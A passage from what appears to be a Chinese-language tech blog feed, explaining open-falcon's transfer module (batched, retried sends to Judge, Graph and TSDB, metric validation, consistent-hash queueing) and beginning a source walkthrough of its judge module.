class="line">proc.SendToJudgeFailCnt.IncrBy(<span class="keyword">int64</span>(count))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">proc.SendToJudgeCnt.IncrBy(<span class="keyword">int64</span>(count))</span><br><span class="line">&#125;</span><br><span class="line">&#125;(addr, judgeItems, count)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>forward2GraphTask启动发送存档数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Graph定时任务, 将 Graph发送缓存中的数据 通过rpc连接池 发送到Graph</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">forward2GraphTask</span><span class="params">(Q *list.SafeListLimited, node <span class="keyword">string</span>, addr <span class="keyword">string</span>, concurrent <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">batch := g.Config().Graph.Batch <span class="comment">// 一次发送,最多batch条数据</span></span><br><span class="line">sema := nsema.NewSemaphore(concurrent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">items := Q.PopBackBy(batch) <span class="comment">//从队列中pop指定大小的数据</span></span><br><span class="line">count := <span class="built_in">len</span>(items)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line">time.Sleep(DefaultSendTaskSleepInterval)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">graphItems := <span class="built_in">make</span>([]*cmodel.GraphItem, count)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">graphItems[i] = items[i].(*cmodel.GraphItem)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sema.Acquire()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(addr <span class="keyword">string</span>, graphItems []*cmodel.GraphItem, count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> sema.Release()</span><br><span class="line"></span><br><span class="line">resp := &amp;cmodel.SimpleRpcResponse&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">sendOk := <span class="literal">false</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123; <span class="comment">//最多重试3次</span></span><br><span class="line">                <span class="comment">// 给graph接口发送数据</span></span><br><span class="line">err = GraphConnPools.Call(addr, <span class="string">"Graph.Send"</span>, graphItems, resp)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">sendOk = <span class="literal">true</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(time.Millisecond * <span class="number">10</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line">            <span class="comment">//   统计数据，方便后续排查当前队列中发送失败和成功数据量</span></span><br><span class="line"><span class="keyword">if</span> !sendOk &#123;</span><br><span class="line">log.Printf(<span class="string">"send to graph %s:%s fail: %v"</span>, node, addr, err)</span><br><span class="line">proc.SendToGraphFailCnt.IncrBy(<span class="keyword">int64</span>(count))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">proc.SendToGraphCnt.IncrBy(<span class="keyword">int64</span>(count))</span><br><span class="line">&#125;</span><br><span class="line">&#125;(addr, graphItems, count)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果有使用tsdb的话，启动tsdb发送task，这边不说了，基本流程类似。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tsdb定时任务, 将数据通过api发送到tsdb</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">forward2TsdbTask</span><span class="params">(concurrent <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">batch := g.Config().Tsdb.Batch <span class="comment">// 一次发送,最多batch条数据</span></span><br><span class="line">retry := g.Config().Tsdb.MaxRetry</span><br><span class="line">sema := nsema.NewSemaphore(concurrent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">items := TsdbQueue.PopBackBy(batch)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(items) == <span class="number">0</span> &#123;</span><br><span class="line">time.Sleep(DefaultSendTaskSleepInterval)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  同步Call + 有限并发 进行发送</span></span><br><span class="line">sema.Acquire()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(itemList []<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> sema.Release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tsdbBuffer bytes.Buffer</span><br><span class="line">count := <span class="built_in">len</span>(itemList)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">tsdbItem := itemList[i].(*cmodel.TsdbItem)</span><br><span class="line">tsdbBuffer.WriteString(tsdbItem.TsdbString())</span><br><span class="line">tsdbBuffer.WriteString(<span class="string">"\n"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; retry; i++ &#123;</span><br><span class="line">err = TsdbConnPoolHelper.Send(tsdbBuffer.Bytes())</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">proc.SendToTsdbCnt.IncrBy(<span class="keyword">int64</span>(<span class="built_in">len</span>(itemList)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">100</span> * time.Millisecond)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">proc.SendToTsdbFailCnt.IncrBy(<span class="keyword">int64</span>(<span class="built_in">len</span>(itemList)))</span><br><span class="line">log.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;(items)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来函数startSenderCron函数中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// send_cron程序入口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">startSenderCron</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> startProcCron()  <span class="comment">//发送队列统计</span></span><br><span class="line"><span class="keyword">go</span> startLogCron()    <span class="comment">//打印日志</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送队列统计数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calcSendCacheSize</span><span class="params">(mapList <span class="keyword">map</span>[<span class="keyword">string</span>]*list.SafeListLimited)</span> <span class="title">int64</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> cnt <span class="keyword">int64</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _, list := <span class="keyword">range</span> mapList &#123;</span><br><span class="line"><span class="keyword">if</span> list != <span class="literal">nil</span> &#123;</span><br><span class="line">cnt += <span class="keyword">int64</span>(list.Len())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cnt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收数据函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">go</span> rpc.StartRpc()                <span class="comment">// rpc接口数据，接收数据</span></span><br><span class="line"><span class="keyword">go</span> socket.StartSocket()          <span class="comment">// tcp方式推送数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 主要看rpc接口，因为socket方式也是小米提供的，底层传输的方法一样。</p><p>rpc update接口用于更新数据并打到缓存队列中去，update方法最终调用RecvMetricValues函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// process new metric values</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RecvMetricValues</span><span class="params">(args []*cmodel.MetricValue, reply *cmodel.TransferResponse, from <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">start := time.Now()</span><br><span class="line">reply.Invalid = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">items := []*cmodel.MetaData&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> args &#123;</span><br><span class="line"><span class="keyword">if</span> v == <span class="literal">nil</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 历史遗留问题.</span></span><br><span class="line"><span class="comment">// 老版本agent上报的metric=kernel.hostname的数据,其取值为string类型,现在已经不支持了;所以,这里硬编码过滤掉</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 很多的过滤策略。</span></span><br><span class="line"><span class="keyword">if</span> v.Metric == <span class="string">"kernel.hostname"</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v.Metric == <span class="string">""</span> || v.Endpoint == <span class="string">""</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v.Type != g.COUNTER &amp;&amp; v.Type != g.GAUGE &amp;&amp; v.Type != g.DERIVE &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v.Value == <span class="string">""</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> v.Step &lt;= <span class="number">0</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(v.Metric)+<span class="built_in">len</span>(v.Tags) &gt; <span class="number">510</span> &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO 呵呵,这里需要再优雅一点</span></span><br><span class="line">now := start.Unix()</span><br><span class="line"><span class="keyword">if</span> v.Timestamp &lt;= <span class="number">0</span> || v.Timestamp &gt; now*<span class="number">2</span> &#123;</span><br><span class="line">v.Timestamp = now</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fv := &amp;cmodel.MetaData&#123;</span><br><span class="line">Metric:      v.Metric,</span><br><span class="line">Endpoint:    v.Endpoint,</span><br><span class="line">Timestamp:   v.Timestamp,</span><br><span class="line">Step:        v.Step,</span><br><span class="line">CounterType: v.Type,</span><br><span class="line">Tags:        cutils.DictedTagstring(v.Tags), <span class="comment">//TODO tags键值对的个数,要做一下限制</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">valid := <span class="literal">true</span></span><br><span class="line"><span class="keyword">var</span> vv <span class="keyword">float64</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> cv := v.Value.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">string</span>:</span><br><span class="line">vv, err = strconv.ParseFloat(cv, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">valid = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">float64</span>:</span><br><span class="line">vv = cv</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">int64</span>:</span><br><span class="line">vv = <span class="keyword">float64</span>(cv)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">valid = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !valid &#123;</span><br><span class="line">reply.Invalid += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fv.Value = vv</span><br><span class="line">items = <span class="built_in">append</span>(items, fv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line">cnt := <span class="keyword">int64</span>(<span class="built_in">len</span>(items))</span><br><span class="line">proc.RecvCnt.IncrBy(cnt)</span><br><span class="line">    <span class="comment">// 统计</span></span><br><span class="line"><span class="keyword">if</span> from == <span class="string">"rpc"</span> &#123;</span><br><span class="line">proc.RpcRecvCnt.IncrBy(cnt)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> from == <span class="string">"http"</span> &#123;</span><br><span class="line">proc.HttpRecvCnt.IncrBy(cnt)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cfg := g.Config()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//   打到对应的缓存队列中去。</span></span><br><span class="line"><span class="keyword">if</span> cfg.Graph.Enabled &#123;</span><br><span class="line">sender.Push2GraphSendQueue(items)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cfg.Judge.Enabled &#123;</span><br><span class="line">sender.Push2JudgeSendQueue(items)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cfg.Tsdb.Enabled &#123;</span><br><span class="line">sender.Push2TsdbSendQueue(items)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reply.Message = <span class="string">"ok"</span></span><br><span class="line">reply.Total = <span class="built_in">len</span>(args)</span><br><span class="line">reply.Latency = (time.Now().UnixNano() - start.UnixNano()) / <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数push2GraphSendQueue函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将数据 打入 某个Graph的发送缓存队列, 具体是哪一个Graph 由一致性哈希 决定</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Push2GraphSendQueue</span><span class="params">(items []*cmodel.MetaData)</span></span> &#123;</span><br><span class="line">cfg := g.Config().Graph</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> items &#123;</span><br><span class="line">        <span class="comment">// 转换数据</span></span><br><span class="line">graphItem, err := convert2GraphItem(item)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"E:"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">pk := item.PK()</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics. 为了效率,放到了这里,因此只有graph是enbale时才能trace</span></span><br><span class="line">proc.RecvDataTrace.Trace(pk, item)</span><br><span class="line">proc.RecvDataFilter.Filter(pk, item.Value, item)</span><br><span class="line"><span class="comment">// 得到对应的一致性hash分片节点</span></span><br><span class="line">node, err := GraphNodeRing.GetNode(pk)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"E:"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cnode := cfg.ClusterList[node]</span><br><span class="line">errCnt := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _, addr := <span class="keyword">range</span> cnode.Addrs &#123;</span><br><span class="line">Q := GraphQueues[node+addr]</span><br><span class="line">             <span class="comment">// 获取队列并推送到缓存队列中去</span></span><br><span class="line"><span class="keyword">if</span> !Q.PushFront(graphItem) &#123;</span><br><span class="line">errCnt += <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// statistics</span></span><br><span class="line"><span class="keyword">if</span> errCnt &gt; <span class="number">0</span> &#123;</span><br><span class="line">proc.SendToGraphDropCnt.Incr()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他两个函数基本类似，都是使用这种方式来将数据推送的内存队列中，然后使用send task 任务发送出去。队列不会堆积，因为发送的时候会出队，不过这样如果发送三次还是失败，这个数据就丢失了。。只能通过统计数据来定位了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-transfer-源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-transfer-源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon transfer 源码分析&quot;&gt;&lt;/a&gt;open-falcon
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon judge 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/judge%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/judge%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:45.892Z</published>
    <updated>2020-01-21T09:06:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-judge源码分析"><a href="#open-falcon-judge源码分析" class="headerlink" title="open-falcon judge源码分析"></a>open-falcon judge源码分析</h2><p>judge模块主要流程在modules/judge/main</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"><span class="comment">// 初始化数据库连接池</span></span><br><span class="line">g.InitRedisConnPool()</span><br><span class="line">    <span class="comment">// 初始化HBS客户端</span></span><br><span class="line">g.InitHbsClient()</span><br><span class="line"><span class="comment">//初始化存储，初始化内存BigMap，存储采集历史数据</span></span><br><span class="line">store.InitHistoryBigMap()</span><br><span class="line"><span class="comment">//http服务启动</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">// rpc服务启动</span></span><br><span class="line"><span class="keyword">go</span> rpc.Start()</span><br><span class="line"><span class="comment">//定时从HBS同步策略</span></span><br><span class="line"><span class="keyword">go</span> cron.SyncStrategies()</span><br><span class="line">    <span class="comment">//清理无效数据</span></span><br><span class="line"><span class="keyword">go</span> cron.CleanStale()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>http服务接口数据，注册route:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">configCommonRoutes()</span><br><span class="line">configInfoRoutes()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看下rpc接口，judge主要有Send函数来做：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Judge)</span> <span class="title">Send</span><span class="params">(items []*model.JudgeItem, resp *model.SimpleRpcResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">remain := g.Config().Remain</span><br><span class="line"><span class="comment">// 把当前时间的计算放在最外层，是为了减少获取时间时的系统调用开销</span></span><br><span class="line">now := time.Now().Unix()</span><br><span class="line"><span class="keyword">for</span> _, item := <span class="keyword">range</span> items &#123;</span><br><span class="line">exists := g.FilterMap.Exists(item.Metric)</span><br><span class="line"><span class="keyword">if</span> !exists &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">pk := item.PrimaryKey()</span><br><span class="line">        <span class="comment">// 接收数据，将数据放到bigMap中去</span></span><br><span class="line">store.HistoryBigMap[pk[<span class="number">0</span>:<span class="number">2</span>]].PushFrontAndMaintain(pk, item, remain, now)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数推送</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *JudgeItemMap)</span> <span class="title">PushFrontAndMaintain</span><span class="params">(key <span class="keyword">string</span>, val *model.JudgeItem, maxCount <span class="keyword">int</span>, now <span class="keyword">int64</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 